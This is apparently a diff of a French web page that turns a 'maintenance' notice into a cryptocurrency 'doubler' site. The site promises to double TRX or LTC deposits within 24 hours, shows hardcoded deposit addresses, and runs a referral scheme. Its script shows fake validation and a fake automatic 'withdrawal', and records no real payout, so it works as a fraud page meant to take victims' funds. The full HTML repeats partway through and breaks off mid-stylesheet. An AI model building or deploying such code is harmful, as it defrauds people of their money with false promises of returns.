@@ -2,106 +2,1655 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Système en maintenance</title>
-  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI&display=swap" rel="stylesheet">
+  <title>X vers X² 24h</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="theme-color" content="#203a43">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="mobile-web-app-capable" content="yes">
   <style>
-    * {
+    html, body {
+      height: 100%;
+      min-height: 100%;
+      width: 100vw;
+      min-width: 100vw;
       box-sizing: border-box;
     }
-
     body {
       margin: 0;
       padding: 0;
-      font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      font-family: 'Segoe UI', Arial, Helvetica, sans-serif;
+      color: #fff;
+      width: 100vw;
+      min-width: 100vw;
+      min-height: 100vh;
+      height: 100vh;
+      overflow-x: hidden;
+      position: relative;
+    }
+    header {
+      text-align: center;
+      padding: 40px 5vw 10px 5vw;
+      perspective: 1000px;
+      width: 100vw;
+      min-width: 100vw;
+      background: transparent;
+    }
+    .title-3d {
+      font-size: 2.2em;
+      font-weight: bold;
+      color: #00ffcc;
+      text-shadow: 2px 2px 0 #000, 4px 4px 0 #00ffcc;
+      transform: rotateX(15deg) rotateY(15deg);
+      animation: float 3s ease-in-out infinite;
+      letter-spacing: 2px;
+      word-break: break-word;
+    }
+    @keyframes float {
+      0%, 100% { transform: rotateX(15deg) rotateY(15deg) translateY(0); }
+      50% { transform: rotateX(15deg) rotateY(15deg) translateY(-10px); }
+    }
+    .box {
+      max-width: 520px;
+      min-width: 0;
+      width: 99vw;
+      margin: 0 auto 20px auto;
+      background: rgba(255,255,255,0.10);
+      padding: 38px 6vw 38px 6vw;
+      border-radius: 22px;
+      box-shadow: 0 0 24px #00ffcc;
+      backdrop-filter: blur(8px);
+      text-align: center;
+      position: relative;
+      /* Make login box higher for more visual comfort */
+    }
+    #loginBox {
+      max-width: 430px;
+      min-height: 340px;
+      padding-top: 55px;
+      padding-bottom: 45px;
+      margin-top: 40px;
+      margin-bottom: 30px;
+      box-shadow: 0 0 32px #00ffcc, 0 10px 30px #2c536455;
+      border-radius: 26px;
+      transition: max-width 0.3s, padding 0.3s;
+    }
+    .retour-btn {
+      display: inline-block;
+      background: #00ffcc;
+      color: #203a43;
+      border: none;
+      border-radius: 8px;
+      padding: 10px 18px;
+      font-weight: bold;
+      font-size: 1em;
+      margin: 8px 0 15px 0;
+      box-shadow: 0 0 10px #00ffcc;
+      cursor: pointer;
+      transition: background 0.2s;
+      position: absolute;
+      left: 10px;
+      top: 10px;
+      z-index: 5;
+    }
+    .retour-btn:hover {
+      background: #2c5364;
+      color: #00ffcc;
+    }
+    .label-gras {
+      font-weight: bold;
+      font-size: 1.09em;
+      color: #fff;
+      letter-spacing: 0.5px;
+    }
+    .input-amount {
+      width: 97%;
+      padding: 13px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 1.4em;
+      background: rgba(255,255,255,0.13);
+      color: #fff;
+      font-weight: 900;
+      text-align: center;
+      box-shadow: 0 0 8px #00ffcc44;
+      letter-spacing: 1px;
+      transition: box-shadow 0.2s;
+    }
+    .input-amount:focus {
+      outline: none;
+      box-shadow: 0 0 0 2px #00ffcc;
+    }
+    ::placeholder {
+      color: #aaa;
+      opacity: 0.7;
+      font-weight: 400;
+      font-size: 1em;
+      letter-spacing: 0px;
+    }
+    button:not(.retour-btn) {
+      width: 97%;
+      padding: 13px;
+      background-color: #00ffcc;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      font-size: 1.09em;
+      cursor: pointer;
+      box-shadow: 0 0 10px #00ffcc;
+      margin-bottom: 10px;
+      color: #203a43;
+    }
+    .section {
+      margin-top: 20px;
+      text-align: left;
+      width: 100%;
+      min-width: 0;
+    }
+    .section h3 {
+      color: #00ffcc;
+      margin-bottom: 10px;
+      text-align: left;
+      font-size: 1.18em;
+      font-weight: bold;
+    }
+    .section ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+    .section li {
+      background: rgba(0,0,0,0.25);
+      margin: 5px 0;
+      padding: 12px 0 12px 0;
+      border-radius: 8px;
+      font-size: 1em;
+    }
+    .ref-link {
+      background: rgba(0,0,0,0.3);
+      padding: 10px;
+      border-radius: 8px;
+      margin-top: 10px;
+      word-break: break-word;
+      font-size: 0.97em;
+    }
+    .qr-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 10px;
+      justify-content: left;
+      width: 100%;
+    }
+    .qr-row img {
+      width: 48px;
+      height: 48px;
+      border-radius: 6px;
+      background: #fff;
+      padding: 2px;
+      border: 1px solid #00ffcc;
+    }
+    .depot-adresses {
+      margin-top: 18px;
+      margin-bottom: 10px;
+      animation: fadein 0.6s;
       display: flex;
       flex-direction: column;
-      justify-content: center;
       align-items: center;
-      min-height: 100vh;
-      color: white;
-    }
-
-    .glass-box {
-      background: rgba(255, 255, 255, 0.1);
-      border-radius: 16px;
-      padding: 30px 20px;
-      backdrop-filter: blur(10px);
-      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-      text-align: center;
-      max-width: 90%;
-      animation: fadeInScale 2s ease;
-    }
-
-    h1 {
-      font-size: 1.8em;
-      margin-bottom: 15px;
-      text-shadow: 1px 1px 0 #ccc,
-                   2px 2px 0 #bbb,
-                   3px 3px 0 #aaa,
-                   4px 4px 0 #999,
-                   5px 5px 0 #888;
-      transform: perspective(500px) rotateX(5deg);
-      animation: glow 2s infinite alternate;
-    }
-
-    p {
-      font-size: 1.1em;
-      opacity: 0.9;
-      margin: 10px 0;
-      animation: fadeIn 2s ease;
-    }
-
-    .marquee {
-      position: fixed;
-      bottom: 0;
       width: 100%;
-      background: rgba(0, 0, 0, 0.3);
+      min-width: 0;
+    }
+    .depot-cadre {
+      background: rgba(0,255,204,0.14);
+      border: 2px solid #00ffcc;
+      border-radius: 15px;
+      padding: 22px 6vw;
+      margin-top: 8px;
+      margin-bottom: 8px;
+      min-width: 0;
+      box-shadow: 0 0 10px #00ffcc33;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      font-size: 1.07em;
+      justify-content: center;
+    }
+    .depot-cadre strong {
+      color: #00ffcc;
+      font-size: 1.18em;
+      margin-bottom: 10px;
+      letter-spacing: 1px;
+      font-weight: bold;
+      text-align: center;
+      width: 100%;
+    }
+    .depot-details {
+      background: transparent;
+      width: 100%;
+      margin-top: 9px;
+      margin-bottom: 5px;
+      font-size: 1.07em;
       color: #fff;
-      font-size: 1em;
-      padding: 10px 0;
+      display: flex;
+      justify-content: center;
+    }
+    .depot-details-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 8px;
+      background: rgba(0,0,0,0.09);
+      border-radius: 8px;
       overflow: hidden;
-      white-space: nowrap;
+      text-align: center;
     }
-
-    .marquee span {
-      display: inline-block;
-      padding-left: 100%;
-      animation: scrollText 25s linear infinite;
+    .depot-details-table th, .depot-details-table td {
+      padding: 7px 4px;
+      text-align: center;
+      font-size: 1.07em;
+      border-bottom: 1px solid #00ffcc44;
     }
-
-    @keyframes scrollText {
-      0% { transform: translateX(0); }
-      100% { transform: translateX(-100%); }
+    .depot-details-table th {
+      background: #00ffcc18;
+      color: #00ffcc;
+      font-weight: bold;
+      letter-spacing: 0.5px;
     }
-
-    @keyframes fadeInScale {
-      0% { opacity: 0; transform: scale(0.9); }
-      100% { opacity: 1; transform: scale(1); }
+    .depot-details-table td {
+      color: #fff;
+      font-weight: bold;
     }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
+    .white-num {
+      color: #fff !important;
+      font-weight: 900;
+      letter-spacing: 1px;
+      font-size: 1.12em;
     }
-
-    @keyframes glow {
-      from { text-shadow: 0 0 5px #fff, 0 0 10px #00f; }
-      to { text-shadow: 0 0 10px #fff, 0 0 20px #0ff; }
+    .crypto-choice {
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+      margin-bottom: 10px;
+    }
+    .crypto-choice label {
+      font-weight: bold;
+      color: #00ffcc;
+      cursor: pointer;
+      font-size: 1.09em;
+    }
+    .montant-converti {
+      margin: 10px 0;
+      font-size: 1.07em;
+      color: #fff;
+      font-weight: bold;
+    }
+    .transaction-gain {
+      margin-top: 12px;
+      background: rgba(0,0,0,0.13);
+      border-radius: 10px;
+      padding: 10px 0;
+      font-size: 1.12em;
+      color: #00ffcc;
+      font-weight: bold;
+    }
+    .transaction-status {
+      margin-top: 12px;
+      border-radius: 8px;
+      padding: 9px 0;
+      font-size: 1em;
+      font-weight: bold;
+      width: 100%;
+      transition: background 0.3s, color 0.3s;
+    }
+    .status-attente {
+      background: #ffc107;
+      color: #333;
+      border: 1.5px solid #e9a700;
+    }
+    .status-valide {
+      background: #22e222;
+      color: #fff;
+      border: 1.5px solid #13b613;
+    }
+    .confirmation-texte {
+      margin-top: 10px;
+      color: #fff;
+      font-style: italic;
+      font-size: 1em;
+      background: rgba(0,0,0,0.10);
+      border-radius: 8px;
+      padding: 8px;
+    }
+    .transaction-tableau {
+      margin-top: 14px;
+      width: 100%;
+      border-collapse: collapse;
+      background: rgba(0,0,0,0.10);
+      border-radius: 12px;
+      overflow: hidden;
+      font-size: 0.97em;
+      min-width: 0;
+    }
+    .transaction-tableau th {
+      background: #00ffcc;
+      color: #203a43;
+      padding: 7px 3px;
+      font-weight: bold;
+      border-bottom: 1.5px solid #00ffcc;
+    }
+    .transaction-tableau td {
+      padding: 7px 3px;
+      border-bottom: 1px solid #0f2027;
+    }
+    .gain-doubled {
+      color: #22e222;
+      font-weight: bold;
+      background: rgba(34,226,34,0.07);
+      border-radius: 7px;
+      padding: 4px 0;
+      font-size: 0.98em;
+      margin-top: 2px;
+    }
+    .message-jaune {
+      background: #fff6d1;
+      color: #a87b00;
+      border: 2px solid #ffe58f;
+      border-radius: 9px;
+      padding: 11px 14px 11px 14px;
+      margin: 16px auto 6px auto;
+      font-size: 1em;
+      font-weight: bold;
+      max-width: 350px;
+      position: relative;
+      box-shadow: 0 0 10px #ffe58f55;
+      text-align: left;
+      display: none;
+      align-items: center;
+      justify-content: space-between;
+      z-index: 100;
+      animation: shake 1s cubic-bezier(.36,.07,.19,.97) 2;
+    }
+    @keyframes shake {
+      10%, 90% { transform: translateX(-2px); }
+      20%, 80% { transform: translateX(4px); }
+      30%, 50%, 70% { transform: translateX(-6px); }
+      40%, 60% { transform: translateX(6px); }
+      100% { transform: translateX(0);}
+    }
+    .close-message {
+      background: none;
+      border: none;
+      font-size: 1.2em;
+      font-weight: bold;
+      color: #a87b00;
+      cursor: pointer;
+      margin-left: 18px;
+      margin-right: -7px;
+    }
+    .disabled-btn {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+    @keyframes fadein {
+      0% { opacity: 0;}
+      100% { opacity: 1;}
+    }
+    @media screen and (max-width: 600px) {
+      .box {
+        max-width: 99vw;
+        margin: 0 0 15px 0;
+        padding: 8vw 2vw 20vw 2vw;
+      }
+      #loginBox {
+        max-width: 99vw;
+        margin-top: 10vw;
+        margin-bottom: 10vw;
+        padding: 15vw 2vw 15vw 2vw;
+      }
+      .depot-cadre {
+        padding: 18px 1vw;
+      }
+      .depot-details-table th, .depot-details-table td {
+        padding: 6px 2px;
+        font-size: 0.98em;
+      }
+      .section h3 { font-size: 1.09em; }
+      .crypto-choice label { font-size: 1em;}
+      button:not(.retour-btn) { font-size: 1em; }
+      input[type="text"], input[type="number"] { font-size: 1em;}
+    }
+    @media screen and (max-width: 400px) {
+      .box { padding: 5px 0 13vw 0; }
+      #loginBox { padding: 10vw 1vw 12vw 1vw;}
+      .depot-cadre { padding: 8px 1vw;}
     }
   </style>
 </head>
 <body>
-  <div class="glass-box">
-    <h1>SYSTÈME EN MAINTENANCE</h1>
-    <p>Nous attendons la fin des réparations</p>
-    <p>Et cela ne prendra pas longtemps, soyez prêts !</p>
-    <p>🔧 Problème d'accès au compte et dépôt en cours de résolution</p>
+
+<header>
+  <div class="title-3d">X vers X² 24h</div>
+</header>
+
+<div class="box" id="loginBox">
+  <button class="retour-btn" style="display:none;" id="retourLogin" onclick="showPage('loginBox')">&larr; Retour</button>
+  <h2 style="margin-bottom:23px;">Connectez-vous avec votre adresse TRX ou LTC</h2>
+  <input type="text" id="cryptoAddress" placeholder="Saisissez votre adresse TRX ou LTC" style="max-width:340px; width:93%; font-size:1.18em; padding:15px; margin-bottom:18px;">
+  <button style="max-width:340px; width:93%; font-size:1.13em; margin-bottom:12px;" onclick="validateAddress()">Connexion</button>
+  <p id="error" style="color: red; font-size:1.08em; margin:8px 0 0 0;"></p>
+</div>
+
+<div class="box" id="dashboard" style="display:none;">
+  <button class="retour-btn" id="retourDashboard" onclick="showPage('loginBox')">&larr; Retour</button>
+  <h2>Tableau de bord</h2>
+
+  <div class="section">
+    <h3>Menu</h3>
+    <ul>
+      <li>
+        <div class="crypto-choice">
+          <label>
+            <input type="radio" name="cryptoType" value="TRX" checked onchange="updateMontantLabel()"> TRX
+          </label>
+          <label>
+            <input type="radio" name="cryptoType" value="LTC" onchange="updateMontantLabel()"> LTC
+          </label>
+        </div>
+        <div id="montantLabel" class="label-gras">Montant en TRX :</div>
+        <input type="number" id="depositInput" class="input-amount" placeholder="Entrez le montant">
+        <button onclick="doDeposit()">Valider</button>
+        <p id="depositError" style="color: red;"></p>
+        <div id="montantConverti" class="montant-converti" style="display:none;"></div>
+        <div id="depotAdresses" class="depot-adresses" style="display:none;">
+          <!-- Cadre complet détails dépot -->
+          <div id="depotCadreTrx" class="depot-cadre" style="display:none;">
+            <strong>Adresse de dépôt TRON (TRX)</strong>
+            <div class="qr-row">
+              <img src="https://api.qrserver.com/v1/create-qr-code/?data=TP32k5jeCVvUTFLisi6mvTJk7k9sEj84aE&amp;size=60x60" alt="QR TRON">
+              <span style="color:#00ffcc; font-weight:bold;">TP32k5jeCVvUTFLisi6mvTJk7k9sEj84aE</span>
+            </div>
+            <div class="depot-details">
+              <table class="depot-details-table">
+                <tr>
+                  <th>Date & Heure</th>
+                  <td class="white-num" id="detailDateTrx">-</td>
+                </tr>
+                <tr>
+                  <th>Montant déposé</th>
+                  <td class="white-num" id="detailMontantTrx">-</td>
+                </tr>
+                <tr>
+                  <th>Gain doublé après 24h</th>
+                  <td class="white-num" id="detailGainTrx">-</td>
+                </tr>
+                <tr>
+                  <th>Statut</th>
+                  <td id="detailStatutTrx">En attente</td>
+                </tr>
+              </table>
+            </div>
+          </div>
+          <div id="depotCadreLtc" class="depot-cadre" style="display:none;">
+            <strong>Adresse de dépôt LTC</strong>
+            <div class="qr-row">
+              <img src="https://api.qrserver.com/v1/create-qr-code/?data=ltc1qd2332k7lc4anqsfvux0fgeu4h9q3j3wgrlaa7t&amp;size=60x60" alt="QR LTC">
+              <span style="color:#00ffcc; font-weight:bold;">ltc1qd2332k7lc4anqsfvux0fgeu4h9q3j3wgrlaa7t</span>
+            </div>
+            <div class="depot-details">
+              <table class="depot-details-table">
+                <tr>
+                  <th>Date & Heure</th>
+                  <td class="white-num" id="detailDateLtc">-</td>
+                </tr>
+                <tr>
+                  <th>Montant déposé</th>
+                  <td class="white-num" id="detailMontantLtc">-</td>
+                </tr>
+                <tr>
+                  <th>Gain doublé après 24h</th>
+                  <td class="white-num" id="detailGainLtc">-</td>
+                </tr>
+                <tr>
+                  <th>Statut</th>
+                  <td id="detailStatutLtc">En attente</td>
+                </tr>
+              </table>
+            </div>
+          </div>
+        </div>
+        <div id="transactionGain" class="transaction-gain" style="display:none;"></div>
+        <div id="transactionStatus" class="transaction-status status-attente" style="display:none;">En attente</div>
+        <button id="btnValiderTransaction" style="display:none;margin-top:10px;background:#22e222;color:#fff;" onclick="validerTransaction()" class="disabled-btn" disabled>Valider la transaction</button>
+      </li>
+      <li style="font-size:1em; color:#00ffcc;">
+        <b>Retrait :</b> Toutes les 24h après votre dépôt, le retrait automatique est effectué.
+      </li>
+      <li>
+        <div style="margin-top:14px;">
+          <table id="transactionTableau" class="transaction-tableau" style="width:100%;margin-bottom:0;">
+            <thead>
+              <tr>
+                <th>Date</th>
+                <th>Type</th>
+                <th>Montant</th>
+                <th>Gain doublé après 24h</th>
+                <th>Statut</th>
+              </tr>
+            </thead>
+            <tbody>
+              <!-- transactions dynamiques ici -->
+            </tbody>
+          </table>
+        </div>
+      </li>
+    </ul>
+    <div id="messageJaune" class="message-jaune" style="display:none;">
+      <span id="messageContentJaune">
+        En attente de votre transfert. Veuillez patienter et ne fermez pas la page.
+      </span>
+      <button class="close-message" onclick="closeMessageJaune()" title="Fermer">&times;</button>
+    </div>
   </div>
 
-  <div class="marquee">
-    <span>Ce site Doubleur est le meilleur fond disponible 🔥 — Problème d'accès au compte et dépôt en cours de résolution 🔧 — Ce site Doubleur est le meilleur fond disponible 🔥</span>
+  <div class="section">
+    <h3>Parrainage</h3>
+    <ul>
+      <li>Commission parrainage : <strong id="commission">0.00</strong></li>
+      <li>Nombre de filleuls : <strong id="refCount">0</strong></li>
+    </ul>
+    <div class="ref-link">
+      Lien de parrainage : <span id="refLink"></span>
+    </div>
   </div>
+</div>
+
+<script>
+  let currentAddress = '';
+  let depositTotal = 0;
+  let lastPage = "loginBox";
+  let transactionStatus = "attente";
+  let transactions = [];
+  let validerTimeout = null;
+  let messageJauneVisible = false;
+
+  let coursTrxToLtc = 0.002;
+  let coursLtcToTrx = 500;
+
+  function showPage(pageId) {
+    document.getElementById('loginBox').style.display = "none";
+    document.getElementById('dashboard').style.display = "none";
+    document.getElementById(pageId).style.display = "block";
+    document.getElementById('retourLogin').style.display = pageId !== "loginBox" ? "inline-block" : "none";
+    document.getElementById('retourDashboard').style.display = pageId !== "dashboard" ? "inline-block" : "none";
+    lastPage = pageId;
+  }
+
+  function validateAddress() {
+    const address = document.getElementById('cryptoAddress').value.trim();
+    const error = document.getElementById('error');
+    const refLink = document.getElementById('refLink');
+    const ltcRegex = /^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$|^ltc1[a-zA-HJ-NP-Z0-9]{39,59}$/;
+    const trxRegex = /^T[a-zA-Z0-9]{33}$/;
+
+    if (ltcRegex.test(address) || trxRegex.test(address)) {
+      error.textContent = '';
+      showPage('dashboard');
+      // *** Correction ici pour le lien de parrainage ***
+      refLink.textContent = 'https://xto2x.netlify.app/?ref=' + address;
+      currentAddress = address;
+      localStorage.setItem("savedAddress", address);
+      autoRetraitIfDue();
+      renderTransactions();
+    } else {
+      error.textContent = 'Adresse invalide. Seules les adresses TRX ou LTC sont acceptées.';
+    }
+  }
+
+  function updateMontantLabel() {
+    const type = getCryptoType();
+    const label = document.getElementById('montantLabel');
+    document.getElementById('depositInput').value = "";
+    document.getElementById('montantConverti').style.display = "none";
+    document.getElementById('depotAdresses').style.display = "none";
+    document.getElementById('depotCadreTrx').style.display = "none";
+    document.getElementById('depotCadreLtc').style.display = "none";
+    document.getElementById('transactionGain').style.display = "none";
+    document.getElementById('transactionStatus').style.display = "none";
+    document.getElementById('btnValiderTransaction').style.display = "none";
+    document.getElementById('messageJaune').style.display = "none";
+    messageJauneVisible = false;
+    if (validerTimeout) clearTimeout(validerTimeout);
+    document.getElementById('btnValiderTransaction').disabled = true;
+    document.getElementById('btnValiderTransaction').classList.add('disabled-btn');
+    if (type === "TRX") {
+      label.textContent = "Montant en TRX :";
+    } else {
+      label.textContent = "Montant en LTC :";
+    }
+    label.className = "label-gras";
+  }
+
+  function getCryptoType() {
+    const radios = document.getElementsByName('cryptoType');
+    for (let i = 0; i < radios.length; i++) {
+      if (radios[i].checked) return radios[i].value;
+    }
+    return "TRX";
+  }
+
+  function doDeposit() {
+    const input = parseFloat(document.getElementById('depositInput').value);
+    const depositError = document.getElementById('depositError');
+    const commission = document.getElementById('commission');
+    const depotAdresses = document.getElementById('depotAdresses');
+    const montantConverti = document.getElementById('montantConverti');
+    const transactionGain = document.getElementById('transactionGain');
+    const transactionStatusDiv = document.getElementById('transactionStatus');
+    const btnValiderTransaction = document.getElementById('btnValiderTransaction');
+    const type = getCryptoType();
+    const depotCadreTrx = document.getElementById('depotCadreTrx');
+    const depotCadreLtc = document.getElementById('depotCadreLtc');
+    const messageJaune = document.getElementById('messageJaune');
+
+    const minTRX = 3;
+    const minLTC = 0.002;
+
+    let isValid = false;
+    let montantTrx = 0, montantLtc = 0;
+
+    if (type === "TRX") {
+      if (input >= minTRX) {
+        isValid = true;
+        montantTrx = input;
+        montantLtc = input * coursTrxToLtc;
+      }
+    } else {
+      if (input >= minLTC) {
+        isValid = true;
+        montantLtc = input;
+        montantTrx = input * coursLtcToTrx;
+      }
+    }
+
+    commission.textContent = "0.00";
+
+    if (isValid) {
+      depositError.textContent = '';
+      depositTotal += (type === "TRX" ? montantTrx : montantLtc * coursLtcToTrx);
+      montantConverti.style.display = "block";
+      montantConverti.innerHTML =
+        `Montant converti : <span class="white-num">${montantTrx.toFixed(3)} TRX</span> &nbsp;|&nbsp; <span class="white-num">${montantLtc.toFixed(3)} LTC</span>`;
+      depotAdresses.style.display = 'flex';
+
+      // Show and fill details in the cadre
+      let now = new Date();
+      let dateStr = now.toLocaleDateString() + " " + now.toLocaleTimeString().slice(0,5);
+      let montantDepot = (type === "TRX" ? montantTrx : montantLtc);
+      let gainDouble = (montantDepot * 2).toFixed(3) + " " + type;
+      let statutTxt = "En attente";
+      if (type === "TRX") {
+        depotCadreTrx.style.display = "flex";
+        depotCadreLtc.style.display = "none";
+        document.getElementById('detailDateTrx').textContent = dateStr;
+        document.getElementById('detailMontantTrx').textContent = montantTrx.toFixed(3) + " TRX";
+        document.getElementById('detailGainTrx').textContent = gainDouble;
+        document.getElementById('detailStatutTrx').textContent = statutTxt;
+        transactionGain.innerHTML = `Votre gain dans 24h : <span class="white-num">${gainDouble}</span> (100% du dépôt ajouté)`;
+      } else {
+        depotCadreTrx.style.display = "none";
+        depotCadreLtc.style.display = "flex";
+        document.getElementById('detailDateLtc').textContent = dateStr;
+        document.getElementById('detailMontantLtc').textContent = montantLtc.toFixed(3) + " LTC";
+        document.getElementById('detailGainLtc').textContent = gainDouble;
+        document.getElementById('detailStatutLtc').textContent = statutTxt;
+        transactionGain.innerHTML = `Votre gain dans 24h : <span class="white-num">${gainDouble}</span> (100% du dépôt ajouté)`;
+      }
+      transactionGain.style.display = "block";
+      transactionStatus = "attente";
+      transactionStatusDiv.textContent = "En attente";
+      transactionStatusDiv.className = "transaction-status status-attente";
+      transactionStatusDiv.style.display = "block";
+      btnValiderTransaction.style.display = "block";
+      btnValiderTransaction.disabled = true;
+      btnValiderTransaction.classList.add('disabled-btn');
+
+      if (validerTimeout) clearTimeout(validerTimeout);
+      validerTimeout = setTimeout(function() {
+        btnValiderTransaction.disabled = false;
+        btnValiderTransaction.classList.remove('disabled-btn');
+      }, 120000);
+
+      // Ajout du gain doublé après 24h au tableau
+      transactions.push({
+        date: dateStr,
+        type: "Dépot",
+        montant: type === "TRX" ? montantTrx.toFixed(3) + " TRX" : montantLtc.toFixed(3) + " LTC",
+        gain: gainDouble,
+        status: "En attente"
+      });
+      renderTransactions();
+
+      // Effet shake pour le message jaune
+      messageJaune.style.display = "flex";
+      messageJaune.classList.remove("shake-animate");
+      void messageJaune.offsetWidth;
+      messageJaune.classList.add("shake-animate");
+      document.getElementById('messageContentJaune').textContent = "En attente de votre transfert. Veuillez patienter et ne fermez pas la page.";
+      messageJauneVisible = true;
+    } else {
+      depositError.textContent = 'Dépôt minimum : 3 TRX ou 0.002 LTC';
+      montantConverti.style.display = "none";
+      depotAdresses.style.display = 'none';
+      depotCadreTrx.style.display = "none";
+      depotCadreLtc.style.display = "none";
+      transactionGain.style.display = "none";
+      transactionStatusDiv.style.display = "none";
+      btnValiderTransaction.style.display = "none";
+      messageJaune.style.display = "none";
+      messageJauneVisible = false;
+      if (validerTimeout) clearTimeout(validerTimeout);
+      btnValiderTransaction.disabled = true;
+      btnValiderTransaction.classList.add('disabled-btn');
+    }
+  }
+
+  function validerTransaction() {
+    const transactionStatusDiv = document.getElementById('transactionStatus');
+    transactionStatus = "valide";
+    transactionStatusDiv.textContent = "Validé";
+    transactionStatusDiv.className = "transaction-status status-valide";
+    document.getElementById('btnValiderTransaction').style.display = "none";
+    if (getCryptoType() === "TRX") {
+      document.getElementById('detailStatutTrx').textContent = "Validé";
+    } else {
+      document.getElementById('detailStatutLtc').textContent = "Validé";
+    }
+    if (transactions.length > 0) {
+      transactions[transactions.length-1].status = "Validé";
+      renderTransactions();
+    }
+    if (validerTimeout) clearTimeout(validerTimeout);
+  }
+
+  function closeMessageJaune() {
+    document.getElementById('messageJaune').style.display = "none";
+    messageJauneVisible = false;
+  }
+
+  function renderTransactions() {
+    const tbody = document.querySelector("#transactionTableau tbody");
+    tbody.innerHTML = "";
+    transactions.forEach(function(tx) {
+      let color = tx.status === "En attente" ? "#ffc107" : "#22e222";
+      let txtColor = tx.status === "En attente" ? "#333" : "#fff";
+      let gainCell = `<span class="gain-doubled">${tx.gain || "-"}</span>`;
+      let montantCell = `<span class="white-num">${tx.montant}</span>`;
+      tbody.innerHTML += `<tr>
+        <td>${tx.date}</td>
+        <td>${tx.type}</td>
+        <td>${montantCell}</td>
+        <td>${gainCell}</td>
+        <td style="background:${color};color:${txtColor};border-radius:8px;font-weight:bold;text-align:center;">${tx.status}</td>
+      </tr>`;
+    });
+  }
+
+  function doWithdraw() {
+    let now = new Date();
+    let dateStr = now.toLocaleDateString() + " " + now.toLocaleTimeString().slice(0,5);
+    transactions.push({
+      date: dateStr,
+      type: "Retrait",
+      montant: "-",
+      gain: "-",
+      status: "Validé"
+    });
+    renderTransactions();
+    depositTotal = 0;
+  }
+
+  function autoRetraitIfDue() {
+    const lastRetrait = localStorage.getItem("lastRetrait");
+    const now = Date.now();
+    const oneDay = 24 * 60 * 60 * 1000;
+    if (!lastRetrait || now - parseInt(lastRetrait) >= oneDay) {
+      doWithdraw();
+      localStorage.setItem("lastRetrait", now.toString());
+    }
+  }
+
+  showPage('loginBox');
+</script>
+
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>X vers X² 24h</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="theme-color" content="#203a43">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="mobile-web-app-capable" content="yes">
+  <style>
+    html, body {
+      height: 100%;
+      min-height: 100%;
+      width: 100vw;
+      min-width: 100vw;
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      font-family: 'Segoe UI', Arial, Helvetica, sans-serif;
+      color: #fff;
+      width: 100vw;
+      min-width: 100vw;
+      min-height: 100vh;
+      height: 100vh;
+      overflow-x: hidden;
+      position: relative;
+    }
+    header {
+      text-align: center;
+      padding: 40px 5vw 10px 5vw;
+      perspective: 1000px;
+      width: 100vw;
+      min-width: 100vw;
+      background: transparent;
+    }
+    .title-3d {
+      font-size: 2.2em;
+      font-weight: bold;
+      color: #00ffcc;
+      text-shadow: 2px 2px 0 #000, 4px 4px 0 #00ffcc;
+      transform: rotateX(15deg) rotateY(15deg);
+      animation: float 3s ease-in-out infinite;
+      letter-spacing: 2px;
+      word-break: break-word;
+    }
+    @keyframes float {
+      0%, 100% { transform: rotateX(15deg) rotateY(15deg) translateY(0); }
+      50% { transform: rotateX(15deg) rotateY(15deg) translateY(-10px); }
+    }
+    .box {
+      max-width: 520px;
+      min-width: 0;
+      width: 99vw;
+      margin: 0 auto 20px auto;
+      background: rgba(255,255,255,0.10);
+      padding: 38px 6vw 38px 6vw;
+      border-radius: 22px;
+      box-shadow: 0 0 24px #00ffcc;
+      backdrop-filter: blur(8px);
+      text-align: center;
+      position: relative;
+      /* Make login box higher for more visual comfort */
+    }
+    #loginBox {
+      max-width: 430px;
+      min-height: 340px;
+      padding-top: 55px;
+      padding-bottom: 45px;
+      margin-top: 40px;
+      margin-bottom: 30px;
+      box-shadow: 0 0 32px #00ffcc, 0 10px 30px #2c536455;
+      border-radius: 26px;
+      transition: max-width 0.3s, padding 0.3s;
+    }
+    .retour-btn {
+      display: inline-block;
+      background: #00ffcc;
+      color: #203a43;
+      border: none;
+      border-radius: 8px;
+      padding: 10px 18px;
+      font-weight: bold;
+      font-size: 1em;
+      margin: 8px 0 15px 0;
+      box-shadow: 0 0 10px #00ffcc;
+      cursor: pointer;
+      transition: background 0.2s;
+      position: absolute;
+      left: 10px;
+      top: 10px;
+      z-index: 5;
+    }
+    .retour-btn:hover {
+      background: #2c5364;
+      color: #00ffcc;
+    }
+    .label-gras {
+      font-weight: bold;
+      font-size: 1.09em;
+      color: #fff;
+      letter-spacing: 0.5px;
+    }
+    .input-amount {
+      width: 97%;
+      padding: 13px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 1.4em;
+      background: rgba(255,255,255,0.13);
+      color: #fff;
+      font-weight: 900;
+      text-align: center;
+      box-shadow: 0 0 8px #00ffcc44;
+      letter-spacing: 1px;
+      transition: box-shadow 0.2s;
+    }
+    .input-amount:focus {
+      outline: none;
+      box-shadow: 0 0 0 2px #00ffcc;
+    }
+    ::placeholder {
+      color: #aaa;
+      opacity: 0.7;
+      font-weight: 400;
+      font-size: 1em;
+      letter-spacing: 0px;
+    }
+    button:not(.retour-btn) {
+      width: 97%;
+      padding: 13px;
